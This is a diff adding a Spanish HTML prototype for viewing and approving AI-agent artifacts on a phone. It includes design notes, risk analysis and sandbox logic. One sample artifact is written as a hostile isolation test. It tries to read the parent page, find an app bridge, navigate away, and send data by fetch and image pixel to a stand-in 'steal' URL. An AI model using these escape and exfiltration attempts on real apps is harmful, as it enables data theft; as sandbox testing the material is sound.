@@ -1,0 +1,701 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>jw · ver y aprobar artefactos desde el teléfono</title>
+<style>
+:root{
+  --bg:#282c34; --panel:#21252b; --fg:#abb2bf; --dim:#5c6370; --line:#3e4451; --sel:#2c313a;
+  --blue:#61afef; --green:#98c379; --yellow:#e5c07b; --red:#e06c75; --magenta:#c678dd; --cyan:#56b6c2;
+  --page:#16181d; --ink:#c3c9d4; --mut:#8a92a0;
+  --mono:'JetBrains Mono',ui-monospace,Menlo,Consolas,monospace;
+  color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--page);color:var(--ink);font:13px/1.55 var(--mono);padding:20px max(14px,env(safe-area-inset-right,0px)) 48px max(14px,env(safe-area-inset-left,0px))}
+.wrap{max-width:1180px;margin-inline:auto;display:flex;flex-direction:column;gap:18px}
+h1{font:600 20px/1.2 var(--mono);margin:0}
+h2{font:600 12px var(--mono);margin:0;color:var(--mut);letter-spacing:.04em}
+h3{font:600 13px var(--mono);margin:0 0 6px;color:var(--ink)}
+p{margin:0;max-width:90ch;color:var(--mut)}
+code,kbd{font:12px var(--mono);background:var(--panel);padding:1px 4px;border-radius:3px;color:var(--ink)}
+button,select{font:12px var(--mono);color:var(--ink);background:var(--panel);border:1px solid var(--line);border-radius:4px;padding:6px 10px;min-height:36px;cursor:pointer}
+button:hover{border-color:var(--blue)}
+button[aria-pressed="true"]{border-color:var(--blue);color:var(--blue)}
+button:disabled{opacity:.4;cursor:not-allowed}
+:focus-visible{outline:2px solid var(--blue);outline-offset:1px}
+.bar{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+.bar .lbl{font:12px var(--mono);color:var(--mut)}
+.stage{display:flex;gap:26px;align-items:flex-start;flex-wrap:wrap}
+.col{display:flex;flex-direction:column;gap:8px;min-width:0}
+.col.ph{flex:0 0 auto;max-width:100%}
+.col.ag{flex:1 1 380px}
+.hint{font:12px var(--mono);color:var(--mut)}
+/* the phone: the classes of mobile.html (hdr, ib, row, fe, panes, status, dock, sheet), scoped to #ph */
+.phone{position:relative;width:390px;max-width:100%;height:min(820px,88svh);min-height:560px;border-radius:36px;border:1px solid var(--line);box-shadow:0 30px 80px rgba(0,0,0,.45);overflow:hidden;background:var(--bg);display:flex;flex-direction:column}
+#ph{position:absolute;inset:0;display:flex;flex-direction:column;background:var(--bg);color:var(--fg);font:13.5px/1.45 var(--mono)}
+#ph button{font:inherit;color:inherit;background:none;border:0;padding:0;margin:0;min-height:0;border-radius:0;cursor:pointer;text-align:left}
+#ph button:hover{border-color:transparent}
+#ph button:focus-visible{outline:2px solid var(--blue);outline-offset:-2px}
+#ph svg.i{width:20px;height:20px;stroke:currentColor;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;flex:none}
+#ph .hdr{background:var(--panel);border-bottom:1px solid var(--line);padding:8px 12px;display:flex;align-items:center;gap:8px;min-height:52px;flex:none}
+#ph .hdr .t{flex:1;min-width:0}
+#ph .hdr .t b{display:block;font-size:14px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+#ph .hdr .t span{display:block;font-size:11px;color:var(--dim);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+#ph .ib{width:44px;height:44px;display:grid;place-items:center;border-radius:6px;flex:none;position:relative}
+#ph .ib .bdg{position:absolute;top:3px;right:1px;min-width:16px;height:16px;border-radius:8px;background:var(--yellow);color:var(--bg);font-size:10px;font-weight:700;display:grid;place-items:center;padding:0 4px;pointer-events:none}
+#ph .ib:active,#ph .row:active{background:var(--sel)}
+#ph .scroll{flex:1;min-height:0;overflow:auto;scrollbar-width:none}
+#ph .scroll::-webkit-scrollbar{display:none}
+#ph .sec{padding:14px 14px 6px;font-size:11px;color:var(--dim);display:flex;gap:8px;width:100%}
+#ph .sec::after{content:'';flex:1;border-top:1px solid var(--line);align-self:center}
+#ph .row{display:flex;align-items:center;gap:8px;min-height:50px;padding:6px 8px 6px 14px;width:100%;border-left:3px solid transparent}
+#ph .row.wt{padding-left:34px}
+#ph .row .o{width:12px;flex:none;text-align:center}
+#ph .row .nm{flex:1;min-width:0}
+#ph .row .nm b{font-weight:500;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+#ph .row .nm span{display:block;font-size:11px;color:var(--dim);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+#ph .row.root .nm b{font-weight:700}
+#ph .row .nm .at{color:var(--cyan);font-size:11.5px;padding:3px 0}
+#ph .row .nm .at.decide{color:var(--yellow)}
+#ph .mk{display:flex;gap:6px;font-size:14px;flex:none}
+#ph .mk .ar{color:var(--cyan)} #ph .mk .dm{color:var(--dim);font-size:11px}
+#ph .inb{display:block;width:100%;padding:10px 14px;border-bottom:1px solid var(--line)}
+#ph .inb .h{display:flex;gap:8px;align-items:center;color:var(--fg)}#ph .inb .h b{font-weight:500;flex:1;min-width:0}
+#ph .inb .ago{flex:none;font-size:11px;color:var(--dim)}
+#ph .inb .tx{display:block;margin:6px 0 0 22px;font-size:12px;color:var(--cyan)}
+#ph .panes{display:flex;border-bottom:1px solid var(--line);background:var(--bg);flex:none}
+#ph .pt{flex:1;height:40px;display:flex;align-items:center;justify-content:center;gap:6px;color:var(--dim);font-size:12.5px;border-right:1px solid var(--line);white-space:nowrap}
+#ph .pt.add{flex:none;width:48px;font-size:20px;color:var(--blue);border-right:0}
+#ph .pt[aria-selected=true]{color:var(--fg);background:var(--sel);box-shadow:inset 0 -2px var(--c)}
+#ph .pt i{width:7px;height:7px;border-radius:50%;background:var(--c)}
+#ph .pt em{font-style:normal;color:var(--yellow);font-weight:700;font-size:11px}
+#ph .out{flex:1;min-height:0;overflow:auto;padding:10px 12px;font-size:12px;line-height:1.55;color:var(--dim)}
+#ph .fe{display:flex;align-items:center;gap:10px;min-height:52px;padding:4px 14px;width:100%;border-bottom:1px solid var(--line)}
+#ph .fe .g{width:18px;text-align:center;flex:none;color:var(--cyan)}
+#ph .fe .nm{flex:1;min-width:0}#ph .fe .nm b{font-weight:500;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}#ph .fe .nm span{display:block;font-size:11px;color:var(--dim);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+#ph .tg{font-size:10.5px;color:var(--cyan);border:1px solid var(--line);border-radius:4px;padding:1px 6px;flex:none}
+#ph .tg.y{color:var(--yellow)}#ph .tg.on{color:var(--green)}#ph .tg.m{color:var(--magenta)}
+#ph .ban{flex:none;display:flex;gap:10px;padding:0 14px;min-height:36px;align-items:center;background:var(--sel);border-bottom:1px solid var(--line);font-size:11px;color:var(--dim)}
+#ph .ban b{color:var(--yellow);font-weight:400}#ph .ban b.g{color:var(--green)}#ph .ban b.r{color:var(--red)}
+#ph .slot{flex:1;min-height:0;position:relative;background:#fff}
+#ph .frame{border:0;width:100%;height:100%;display:block;background:#fff}
+#ph .centre{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;padding:24px;text-align:center;color:var(--dim);background:var(--bg)}
+#ph .centre .big{font-size:15px;color:var(--fg);font-weight:700}
+#ph .status{display:flex;align-items:center;gap:8px;height:30px;padding:0 12px;background:var(--panel);border-top:1px solid var(--line);font-size:11.5px;flex:none}
+#ph .status .chip{font-weight:700;font-size:10.5px;padding:1px 8px;border-radius:10px;background:var(--c,var(--green));color:var(--bg)}
+#ph .status .hint{color:var(--dim);flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+#ph .status .msg{color:var(--yellow)}#ph .status .route{color:var(--cyan)}
+#ph .dock{display:flex;flex-direction:column;gap:8px;padding:8px 12px;background:var(--panel);border-top:1px solid var(--line);flex:none}
+#ph .dock .p{font-size:11px;color:var(--dim);display:flex;justify-content:space-between;gap:8px}
+#ph .yn{display:flex;gap:6px}
+#ph .yn button{flex:1;height:48px;border-radius:6px;display:grid;place-items:center;font-weight:700;text-align:center}
+#ph .yn .y{background:color-mix(in srgb,var(--green) 20%,transparent);color:var(--green);border:1px solid color-mix(in srgb,var(--green) 50%,transparent)}
+#ph .yn .c{background:color-mix(in srgb,var(--yellow) 16%,transparent);color:var(--yellow);border:1px solid color-mix(in srgb,var(--yellow) 50%,transparent)}
+#ph .yn .n{border:1px solid var(--line)}
+#ph .yn button:disabled{opacity:.4;cursor:not-allowed}
+#ph .done{height:48px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-weight:700;gap:8px}
+#ph .done.y{background:color-mix(in srgb,var(--green) 14%,transparent);color:var(--green);border:1px solid color-mix(in srgb,var(--green) 40%,transparent)}
+#ph .done.c{background:color-mix(in srgb,var(--magenta) 14%,transparent);color:var(--magenta);border:1px solid color-mix(in srgb,var(--magenta) 40%,transparent)}
+#ph .done.q{border:1px dashed var(--line);color:var(--dim)}
+#ph .back{position:absolute;inset:0;background:rgba(0,0,0,.5);z-index:10}
+#ph .sheet{position:absolute;left:0;right:0;bottom:0;max-height:78%;background:var(--panel);border-top:1px solid var(--line);border-radius:14px 14px 0 0;z-index:11;display:flex;flex-direction:column;padding-bottom:12px}
+#ph .sheet .grab{width:36px;height:4px;border-radius:2px;background:var(--line);margin:8px auto 4px}
+#ph .sheet h3{margin:0;padding:6px 14px 8px;font-size:12px;color:var(--dim);font-weight:500}
+#ph .sheet textarea{width:calc(100% - 24px);margin:0 12px 8px;min-height:96px;border-radius:6px;border:1px solid var(--blue);background:var(--bg);color:var(--fg);padding:10px 12px;font:inherit;resize:none}
+#ph .sheet .yn{padding:0 12px}
+#ph .lk{display:flex;align-items:center;gap:12px;min-height:48px;padding:0 14px;width:100%}
+#ph .lk kbd{min-width:34px;text-align:center;font:inherit;font-size:12px;border:1px solid var(--line);background:var(--bg);border-radius:4px;padding:3px 6px;color:var(--yellow)}
+#ph .lk span{flex:1}#ph .lk em{font-style:normal;color:var(--dim);font-size:11px}
+#ph .lk[aria-current=true]{background:var(--sel)}
+#ph .shade{position:absolute;inset:0;z-index:12}
+#ph .menu{position:absolute;top:50px;right:8px;width:236px;background:var(--panel);border:1px solid var(--line);border-radius:10px;box-shadow:0 14px 36px rgba(0,0,0,.55);z-index:13;padding:4px 0;overflow:hidden}
+#ph .menu button{display:flex;align-items:center;gap:12px;min-height:48px;padding:0 14px;width:100%}
+#ph .menu button:active{background:var(--sel)}
+#ph .menu button svg.i{color:var(--dim)}
+#ph .menu button .pm{width:20px;text-align:center;color:var(--dim);font-size:16px;flex:none}
+#ph .menu button span.l{flex:1}
+#ph .menu button.hot .pm{color:var(--cyan)}
+.term{background:var(--bg);border:1px solid var(--line);border-radius:8px;padding:10px;min-height:260px;max-height:460px;overflow:auto}
+.term pre{margin:0;font:12.5px/1.45 var(--mono);color:var(--fg);white-space:pre-wrap;word-break:break-word}
+.term .p{color:var(--green)}.term .d{color:var(--dim)}.term .e{color:var(--red)}.term .a{color:var(--yellow)}.term .c{color:var(--cyan)}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:14px 16px;color:var(--fg)}
+.card ul,.card ol{margin:0;padding-left:20px;display:flex;flex-direction:column;gap:6px}
+.card table{border-collapse:collapse;width:100%;font:12px var(--mono)}
+.card td,.card th{border-bottom:1px solid var(--line);padding:6px 8px;text-align:left;vertical-align:top}
+.card th{color:var(--mut);font-weight:600}
+.tw{overflow-x:auto}
+pre.fig{margin:0;font:12px/1.5 var(--mono);color:var(--fg);overflow-x:auto}
+.q{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:14px 16px;display:flex;flex-direction:column;gap:10px}
+.q h3 span{color:var(--yellow)}
+.opt{display:flex;gap:10px;align-items:flex-start;padding:8px 10px;border-radius:6px;border:1px solid var(--line);cursor:pointer;background:var(--bg);min-height:48px}
+.opt input{margin-top:4px;flex:0 0 auto;width:18px;height:18px}
+.opt.rec{border-color:var(--green)}
+.opt:has(input:checked){border-color:var(--blue);background:var(--sel)}
+.opt .tx{color:var(--fg);font-size:13px}
+.opt .tx b{color:var(--ink)}
+.tag{font:11px var(--mono);color:var(--green)}
+.live{font:11px var(--mono);color:var(--cyan)}
+.risk{border-left:3px solid var(--red);padding:2px 0 2px 12px;display:flex;flex-direction:column;gap:2px}
+.risk b{font:600 12px var(--mono);color:var(--red)}
+@media (max-width:520px){
+  body{padding-top:12px}
+  .stage{gap:16px}
+  .col.ph{width:100%}
+  .phone{width:100%;border-radius:12px;box-shadow:none}
+}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div>
+    <h1>Artefactos en el teléfono</h1>
+    <p>Un agente produce un artefacto (un prototipo, un documento HTML, un informe, una spec renderizada) y lo <b>publica</b>. El teléfono, por el enlace que jw ya tiene, lo <b>ve</b> y lo <b>aprueba</b> o <b>pide cambios</b>; el veredicto vuelve al agente. <b>Nada corre 24/7 y no se abre ningún puerto nuevo</b>: el HTML viaja como texto por el WebSocket ya autenticado del puente, por la red local o por el túnel, y todo se apaga con el enlace.</p>
+    <p style="margin-top:6px">A la izquierda, el teléfono (usa los tres botones de abajo para el estado del enlace). A la derecha, el terminal del agente: ahí se ve lo que publica y lo que recibe. Cada decisión de <b>PARA DECIDIR</b> marcada con <span class="live">● en vivo</span> cambia lo que ves en el teléfono.</p>
+  </div>
+
+  <div class="bar" role="group" aria-label="Estado del enlace">
+    <span class="lbl">ENLACE DEL TELÉFONO</span>
+    <button type="button" data-link="lan" aria-pressed="true">encendido · red local</button>
+    <button type="button" data-link="tunnel" aria-pressed="false">encendido · túnel</button>
+    <button type="button" data-link="off" aria-pressed="false">apagado</button>
+  </div>
+
+  <div class="stage">
+    <div class="col ph"><h2>TELÉFONO</h2><div class="phone"><div id="ph"></div></div>
+      <div class="hint" id="phHint"></div></div>
+    <div class="col ag"><h2>TERMINAL DEL AGENTE · claude en feat/phone-artifacts</h2>
+      <div class="bar">
+        <button type="button" data-ag="v2">publica «Informe» v2</button>
+        <button type="button" data-ag="new">publica un artefacto nuevo</button>
+        <button type="button" data-ag="big">publica uno de 3 MiB</button>
+        <button type="button" data-ag="evil">publica el hostil</button>
+      </div>
+      <div class="bar">
+        <label class="bar"><input type="checkbox" id="wait"> <span class="hint">con <code>--wait</code> (el comando espera el veredicto)</span></label>
+        <label class="bar"><input type="checkbox" id="gone"> <span class="hint">el agente ya cerró</span></label>
+      </div>
+      <div class="term"><pre id="term"></pre></div>
+    </div>
+  </div>
+
+  <div>
+    <h2>CÓMO VIAJA — nada nuevo escucha</h2>
+    <div class="card" style="margin-top:8px">
+<pre class="fig">teléfono ─ WSS red local (TLS autofirmado, REQ-81) ─┐
+                                                     ├─ puente (crates/web) ─ socket ─ daemon
+teléfono ─ WSS túnel cloudflared (REQ-80) ──────────┘                                     │
+                                                                          estado del daemon: copias
+   auth {device, secret} ─▶ ready ─▶ cmd artifact_ls | artifact_read | artifact_decide     inmutables por versión
+
+agente (pane) ─ jw artifact publish ─▶ socket local del daemon ─▶ guarda la versión, avisa al teléfono</pre>
+      <ul style="margin-top:10px">
+        <li><b>Un teléfono sin autenticar no ve nada</b>: el puente sigue sin hablar con el daemon antes de <code>ready</code> (REQ-73) y sigue rechazando cualquier <code>Origin</code> (REQ-72). No hay rutas HTTP que proteger.</li>
+        <li><b>Enlace apagado = artefactos inalcanzables</b> desde fuera (REQ-190); el CLI del agente sigue funcionando en local.</li>
+        <li><b>Comandos nuevos para el teléfono</b>: <code>artifact_ls</code>, <code>artifact_read {id, n}</code> (devuelve el texto), <code>artifact_decide {id, n, hash, type, text}</code>. <code>publish</code> y <code>rm</code> son <b>solo del CLI local</b>.</li>
+        <li><b>Hoy el puente deja pasar todo salvo el prefijo <code>mobile_</code></b> (<code>bridge.rs:392</code>, una lista de prohibidos, no de permitidos). Por eso la spec debe rechazar explícitamente <code>artifact_publish</code> y <code>artifact_rm</code> por ese canal.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div>
+    <h2>QUÉ SE CONSTRUIRÍA — la capacidad de CLI, sin flujo cerrado</h2>
+    <div class="card" style="margin-top:8px">
+<pre class="fig">jw artifact publish &lt;archivo&gt; [--name N] [--title T] [--kind prototype|document|report|spec] [--wait]
+jw artifact ls [--json]            # lo que hay, por worktree, con su estado y su versión
+jw artifact wait &lt;id&gt;              # espera el veredicto de la última versión (exit 0 aprobado, 4 cambios; el 3 ya es «hay una pregunta»)
+jw artifact rm &lt;id&gt;                # lo quita (solo desde el PC)</pre>
+      <p style="margin-top:8px">Qué hace el agente con el veredicto es cosa suya: puede ignorar <code>--wait</code> y leer el prompt que llega, o esperar. jw no decide el flujo.</p>
+    </div>
+  </div>
+
+  <div>
+    <h2>PARA DECIDIR — mi recomendación va primero, en verde</h2>
+    <div style="display:flex;flex-direction:column;gap:12px;margin-top:8px" id="decide"></div>
+  </div>
+
+  <div>
+    <h2>AISLAMIENTO — prueba aquí mismo</h2>
+    <div class="card" style="margin-top:8px">
+      <p style="margin-bottom:8px">Publica «el hostil» y ábrelo: intenta leer la página que lo contiene, buscar un puente a la app, usar la red y salir de la ventana. El <code>iframe</code> del teléfono hace de WebView (la página del prototipo hace de app). <b>En el dispositivo hay que comprobarlo de verdad</b> (<code>loadDataWithBaseURL</code>, <code>blockNetworkLoads</code>, sin <code>addJavascriptInterface</code>): esto es una imitación en el navegador, no la prueba de Android.</p>
+    </div>
+  </div>
+
+  <div>
+    <h2>PARA LA SPEC — lo que saldría de aquí (en la spec: N171, REQ-759..791, RAT-113..119, RISK-107..113, OPEN-57..60, versión 0.0.39)</h2>
+    <div class="card" style="margin-top:8px;display:flex;flex-direction:column;gap:12px">
+      <div class="risk"><b>RISK a · el JS de un artefacto llega al canal del teléfono</b>
+        El puente reenvía casi cualquier comando de un teléfono autenticado, incluido <code>write</code> a cualquier pane del PC. Si el JavaScript de un artefacto alcanzara el WebSocket o el secreto, podría teclear en cualquier terminal. Frontera: el WebSocket y el secreto viven en Kotlin; el WebView no tiene puente hacia ellos (sin <code>addJavascriptInterface</code>, sin acceso a archivos ni a contenido, red bloqueada, navegación bloqueada), y la página va en un <code>iframe</code> en sandbox con una CSP que la app fija, no el artefacto.</div>
+      <div class="risk"><b>RISK b · el artefacto imita la barra de aprobar, o se aprueba una versión que ya cambió</b>
+        La barra es nativa, fuera del WebView, y el veredicto va atado a <code>(id, versión, hash)</code>: si el agente publicó otra versión mientras tanto, el veredicto se rechaza.</div>
+      <div class="risk"><b>RISK c · tamaño</b>
+        <code>MAX_MESSAGE</code> es 1 MiB (<code>bridge.rs:24</code>) y se aplica al leer del teléfono (<code>bridge.rs:282</code>); no verifiqué que valga del daemon al teléfono. Propongo 512 KiB por artefacto en la v1 (cabe en un mensaje). Alternativa: leer por trozos (OPEN).</div>
+      <div class="risk"><b>RISK d · lista de prohibidos del puente</b>
+        <code>refused_control</code> solo rechaza <code>mobile_*</code>; hace falta rechazar explícitamente <code>artifact_publish</code> y <code>artifact_rm</code> (REQ nuevo).</div>
+      <div class="risk"><b>RISK e · copia en el teléfono tras revocar</b>
+        Los artefactos en caché viven en el almacenamiento privado de la app; al revocar o desemparejar, la app los borra. Un teléfono robado y desbloqueado los ve: igual que ya ve el resto de la app.</div>
+      <p>Orden previsto de partes tras aprobar: <b>spec</b>; <b>a</b> daemon (almacén, versiones, CLI); <b>b</b> puente (comandos, rechazos); <b>c</b> Android (lista, vista aislada, barra); <b>d</b> skill de agente. Ids tomados por encima de main (0.0.37) y de <code>fix/refresh-commands-after-reload</code> (N170, 0.0.38); hay que volver a fusionar y comprobar antes de cada commit.</p>
+    </div>
+  </div>
+</div>
+
+<script id="logic">
+// Pure part: no DOM. Tested with node by extracting this block (see the test beside the prototype's session).
+const MAX_BYTES = 512 * 1024;
+const CSP = "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; font-src data:; media-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'; object-src 'none'";
+
+function byteLen(s) { return new TextEncoder().encode(s).length; }
+// The real one is a SHA-256 prefix; the prototype only needs a short stable tag.
+function hash(s) {
+  let h = 0x811c9dc5;
+  for (let i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = Math.imul(h, 0x01000193) >>> 0; }
+  return h.toString(16).padStart(8, '0').slice(0, 6);
+}
+function kib(n) { return n >= 1048576 ? (n / 1048576).toFixed(1) + ' MiB' : Math.max(1, Math.round(n / 1024)) + ' KiB'; }
+
+// The page the WebView loads: the app's own CSP, then the artifact inside an iframe's srcdoc, as an attribute value
+// (a `<!-- <head>` trick in the artifact cannot move the CSP). mode: layers (sandbox + CSP), csp (CSP only), static (no scripts).
+function shell(html, mode) {
+  const attr = html.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
+  const csp = mode === 'static' ? CSP.replace("script-src 'unsafe-inline'", "script-src 'none'") : CSP;
+  const sandbox = mode === 'layers' ? 'sandbox="allow-scripts" ' : mode === 'static' ? 'sandbox="" ' : '';
+  return '<!doctype html><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="' + csp + '">'
+    + '<style>html,body{margin:0;height:100%;background:#fff}iframe{border:0;width:100%;height:100%;display:block}</style>'
+    + '<iframe ' + sandbox + 'srcdoc="' + attr + '"></iframe>';
+}
+
+function newStore() { return { seq: 0, now: 0, items: [] }; }
+function latest(item) { return item.versions[item.versions.length - 1]; }
+function status(item) { const v = latest(item).verdict; return v ? v.type : 'pending'; }
+
+// A new version of the same (workspace, name), or a new artifact. Over the cap it is refused and nothing is stored.
+function publish(store, p) {
+  const size = byteLen(p.html);
+  if (size > MAX_BYTES) return { ok: false, why: 'too_big', size, limit: MAX_BYTES };
+  store.now += 1;
+  let item = store.items.find(i => i.ws === p.ws && i.name === p.name);
+  if (!item) {
+    item = { id: 'a' + (++store.seq), ws: p.ws, name: p.name, title: p.title, kind: p.kind, versions: [] };
+    store.items.push(item);
+  } else { item.title = p.title; }
+  const v = { n: item.versions.length + 1, hash: hash(p.html), size, at: store.now, html: p.html, verdict: null, pane: p.pane || null };
+  item.versions.push(v);
+  return { ok: true, item, version: v };
+}
+
+function agentMessage(item, v, type, text) {
+  const head = '[jw] artefacto «' + item.title + '» v' + v.n + ' (' + v.hash + ')';
+  return type === 'approved'
+    ? head + ': APROBADO desde el teléfono.'
+    : head + ': CAMBIOS pedidos desde el teléfono:\n' + text.trim();
+}
+
+// The verdict of the phone. It is bound to the version and its hash; link off refuses it.
+function decide(store, d) {
+  const item = store.items.find(i => i.id === d.id);
+  if (!item) return { ok: false, why: 'unknown' };
+  if (d.link === 'off') return { ok: false, why: 'link_off' };
+  const v = latest(item);
+  if (d.n !== v.n || d.hash !== v.hash) return { ok: false, why: 'stale', latest: v.n };
+  if (v.verdict) return { ok: false, why: 'decided' };
+  if (d.type === 'changes' && !(d.text || '').trim()) return { ok: false, why: 'empty' };
+  if (d.type !== 'changes' && d.type !== 'approved') return { ok: false, why: 'type' };
+  store.now += 1;
+  const sendsToAgent = d.type === 'changes' || d.approveToAgent !== false;
+  const delivered = sendsToAgent ? (d.agentAlive ? 'agent' : 'none') : 'mark';
+  v.verdict = { type: d.type, text: d.type === 'changes' ? d.text.trim() : '', at: store.now, delivered };
+  return { ok: true, delivered, msg: sendsToAgent && d.agentAlive ? agentMessage(item, v, d.type, d.text || '') : null, item, version: v };
+}
+
+// What the list shows: a group per worktree, the ones that wait first; decided ones apart.
+function groups(store) {
+  const by = new Map();
+  for (const it of store.items) {
+    if (!by.has(it.ws)) by.set(it.ws, { ws: it.ws, pending: [], decided: [] });
+    by.get(it.ws)[status(it) === 'pending' ? 'pending' : 'decided'].push(it);
+  }
+  const out = [...by.values()];
+  const rec = it => latest(it).at;
+  for (const g of out) { g.pending.sort((a, b) => rec(b) - rec(a)); g.decided.sort((a, b) => rec(b) - rec(a)); }
+  out.sort((a, b) => b.pending.length - a.pending.length || a.ws.localeCompare(b.ws));
+  return out;
+}
+function pendingCount(store) { return store.items.filter(i => status(i) === 'pending').length; }
+
+if (typeof module !== 'undefined') module.exports = { MAX_BYTES, CSP, byteLen, hash, kib, shell, newStore, latest, status, publish, decide, agentMessage, groups, pendingCount };
+</script>
+
+<script id="data">
+// Sample artifacts. `<\/script>` so this block does not close early.
+const A_PROTO = `<!doctype html><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{font:15px system-ui;margin:0;padding:16px;background:#fff;color:#222}h1{font-size:18px;margin:0 0 6px}button{font:inherit;padding:12px 16px;border-radius:8px;border:1px solid #bbb;background:#f4f4f4;min-height:48px;width:100%;text-align:left}.on{background:#2b7;color:#fff;border-color:#2b7}.card{border:1px solid #ddd;border-radius:10px;padding:12px;margin:12px 0}small{color:#777}</style><h1>Ajustes · propuesta B</h1><small>Prototipo con JavaScript: tócalo.</small><div class="card"><button id="b">Notificaciones: apagadas</button></div><div class="card"><button id="t">Tema: oscuro</button></div><p id="c">Toques: 0</p><script>var n=0,on=false,dark=true;b.onclick=function(){on=!on;n++;b.className=on?'on':'';b.textContent='Notificaciones: '+(on?'encendidas':'apagadas');c.textContent='Toques: '+n};t.onclick=function(){dark=!dark;n++;document.body.style.background=dark?'#fff':'#222';document.body.style.color=dark?'#222':'#eee';t.textContent='Tema: '+(dark?'oscuro':'claro');c.textContent='Toques: '+n}<\/script>`;
+const A_REPORT = `<!doctype html><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{font:14px/1.5 system-ui;margin:0;padding:16px;color:#222;background:#fff}h1{font-size:18px}table{border-collapse:collapse;width:100%}td,th{border-bottom:1px solid #ddd;padding:6px;text-align:left}.bar{height:10px;background:#4a90d9;border-radius:3px}.bar.b{background:#d9534a}</style><h1>Informe de rendimiento</h1><p>CPU en reposo del daemon, antes y después de la corrección.</p><table><tr><th>Caso</th><th>Antes</th><th>Después</th></tr><tr><td>reposo</td><td>4.1 %<div class="bar b" style="width:82%"></div></td><td>0.3 %<div class="bar" style="width:6%"></div></td></tr><tr><td>diff abierto</td><td>9.8 %<div class="bar b" style="width:98%"></div></td><td>2.2 %<div class="bar" style="width:22%"></div></td></tr></table><p><b>Conclusión:</b> un solo cambio, medido dos veces.</p>`;
+const A_SPEC = `<!doctype html><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{font:14px/1.55 system-ui;margin:0;padding:16px;color:#222;background:#fff}h1{font-size:19px}h2{font-size:15px;margin:16px 0 4px}code{background:#eee;padding:1px 4px;border-radius:3px}li{margin:3px 0}</style><h1>N167 · «Otra…» en una pregunta</h1><h2>Contrato</h2><p>Una pregunta ofrece <code>Otra…</code>: una respuesta libre junto a sus opciones.</p><h2>Criterios</h2><ul><li>WHEN el usuario elige <code>Otra…</code>, el daemon toma <code>text</code> como respuesta propia.</li><li>WHILE la pregunta es de selección múltiple, el texto se suma a lo marcado.</li></ul>`;
+const A_EVIL = `<!doctype html><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{font:13px/1.5 ui-monospace,Menlo,monospace;margin:0;padding:14px;background:#fff;color:#222}h1{font-size:16px;margin:0 0 4px}li{margin:6px 0;list-style:none}b.ok{color:#1a7f37}b.bad{color:#c62828}ul{padding:0}</style><h1>Prueba de aislamiento</h1><small>Este artefacto intenta salir. Cada fila es un intento.</small><ul id="r"></ul><script>
+var r=document.getElementById('r'),viol=[];
+document.addEventListener('securitypolicyviolation',function(e){viol.push(e.violatedDirective)});
+function row(name,blocked,detail){var li=document.createElement('li');li.innerHTML=(blocked?'<b class="ok">BLOQUEADO</b> ':'<b class="bad">¡PASÓ!</b> ')+name+(detail?' <small>— '+detail+'</small>':'');r.appendChild(li)}
+function tryit(name,fn){try{var v=fn();if(v&&v.then){v.then(function(x){row(name,false,String(x))},function(e){row(name,true,e&&e.name||'error')})}else{row(name,false,String(v))}}catch(e){row(name,true,e.name)}}
+tryit('leer la página que me contiene (parent.document)',function(){return parent.document.title||'(vacío)'});
+tryit('buscar un puente a la app (window.Android, window.jw)',function(){var b=window.Android||window.jw||parent.Android||parent.jw;if(!b)throw {name:'no hay puente'};return 'lo hay'});
+tryit('localStorage',function(){return localStorage.length});
+tryit('document.cookie',function(){return document.cookie||'(vacía)'});
+tryit('salir de la ventana (top.location)',function(){top.location.href='https://example.com/';return 'navegó'});
+tryit('abrir una ventana (window.open)',function(){var w=window.open('https://example.com/');if(!w)throw {name:'popup bloqueado'};return 'abrió'});
+tryit('fetch a la red',function(){return fetch('https://example.com/steal?d=1').then(function(){return 'respondió'})});
+var img=new Image();img.src='https://example.com/pixel.gif?d=1';
+setTimeout(function(){row('imagen externa (exfiltrar por &lt;img&gt;)',viol.indexOf('img-src')>=0||viol.indexOf('default-src')>=0,'violación de CSP: '+(viol.join(', ')||'ninguna'))},400);
+<\/script>`;
+</script>
+
+<script id="app">
+(function(){
+const $ = s => document.querySelector(s);
+const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+
+const WS = { a: 'jw · feat/phone-artifacts', b: 'jw · feat/ask-other', c: 'api · feat/billing' };
+const store = newStore();
+const seed = (ws, name, title, kind, html, pane) => publish(store, { ws, name, title, kind, html, pane });
+seed(WS.a, 'informe', 'Informe de rendimiento', 'report', A_REPORT, 'p3');
+decide(store, { id: 'a1', n: 1, hash: latest(store.items[0]).hash, type: 'approved', agentAlive: true, link: 'lan' });
+seed(WS.a, 'ajustes', 'Prototipo de ajustes', 'prototype', A_PROTO, 'p3');
+seed(WS.b, 'n167', 'Spec N167 renderizada', 'spec', A_SPEC, 'p7');
+
+const S = {
+  link: 'lan', screen: 'ws', ws: WS.a, tab: 'claude', menu: true, from: 'arts', artId: null, ver: null, sheet: null, confirm: false, showDecided: {}, draft: '',
+  agentAlive: true, wait: false,
